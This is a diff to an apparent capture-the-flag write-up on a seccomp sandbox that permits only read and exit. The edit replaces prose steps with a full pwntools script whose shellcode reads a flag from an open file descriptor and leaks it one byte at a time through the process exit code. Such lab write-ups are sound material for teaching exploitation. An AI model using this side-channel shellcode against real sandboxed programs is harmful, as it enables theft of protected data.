@@ -59,43 +59,61 @@ int main(int argc, char **argv, char **envp)
 }
 ```
 
-= Side-Channel Leak via Exit Code
-
-== Introduction
-
-This level implements a highly restrictive sandbox using seccomp-bpf. Only the `read` and `exit` system calls are permitted, making traditional exploitation (e.g., writing the flag to stdout) impossible.
-
 == Vulnerability Analysis
 
-The program opens a file specified in `argv[1]` before enabling the seccomp filter. This file descriptor (usually 3) remains open and readable by the shellcode. However, because `write` is blocked, there is no direct way to output the data read from the file.
+The challenge allows us to open a file (via `argv[1]`), but the seccomp filter restricts us to only `read` and `exit`. We cannot use `write` to print the flag to stdout.
 
-We can use the `exit` system call's argument (the exit code) as a side-channel to leak information.
+However, the `exit` syscall takes an integer argument (the exit status), which is returned to the parent process. This creates a side-channel: we can read one byte of the flag and pass it as the exit code. By repeating this process for each byte, we can reconstruct the entire flag.
 
-== Exploitation Steps
+== Exploitation Plan
 
-=== 1. Reading the Flag
-The shellcode uses the `read` syscall to bring the flag into memory.
+1.  **Read Flag:** Use the `read` syscall to read the flag from the pre-opened file descriptor (FD 3) into memory.
+2.  **Leak Byte:** Select a specific byte from the read buffer and use it as the argument for the `exit` syscall.
+3.  **Automation:** Write a script to run the binary repeatedly, incrementing the index of the byte to leak, and capturing the process's exit code each time.
 
-```nasm
-/* read(3, buf, 100) */
-mov rdi, 3
-mov rsi, buf_addr
-mov rdx, 100
-mov rax, 0
-syscall
+== Exploit Script
+
+```python
+from pwn import *
+
+exe = "./challenge"
+context.binary = exe
+
+flag = ""
+index = 0
+
+while True:
+    # Shellcode to read flag and exit with byte at 'index'
+    shellcode = asm(f"""
+        /* read(3, stack, 100) */
+        mov rdi, 3          /* fd: 3 */
+        mov rsi, rsp        /* buffer */
+        mov rdx, 100        /* count */
+        mov rax, 0          /* syscall: SYS_read */
+        syscall
+
+        /* exit(buffer[index]) */
+        movzx rdi, byte ptr [rsp + {index}]
+        mov rax, 60         /* syscall: SYS_exit */
+        syscall
+    """)
+
+    # Run with /flag as argument to open it on FD 3
+    p = process([exe, "/flag"], level='error')
+    p.send(shellcode)
+    
+    # Wait for process to exit and get the exit code
+    p.wait()
+    exit_code = p.poll()
+    p.close()
+
+    # Null terminator or error implies end of string
+    if exit_code <= 0:
+        break
+        
+    flag += chr(exit_code)
+    print(f"Leaked: {flag}")
+    index += 1
+
+print(f"Final Flag: {flag}")
 ```
-
-=== 2. Leaking via Exit Code
-We extract a single byte from the buffer and pass it as the argument to the `exit` syscall.
-
-```nasm
-/* exit(buf[index]) */
-movzx rdi, byte ptr [buf_addr + index]
-mov rax, 60
-syscall
-```
-
-=== 3. Automated Reconstruction
-A python script runs the challenge multiple times, once for each character position in the flag. After each run, it retrieves the exit code using `process().poll()`, effectively reconstructing the flag byte by byte.
-
-The leaked flag was: `falg`.
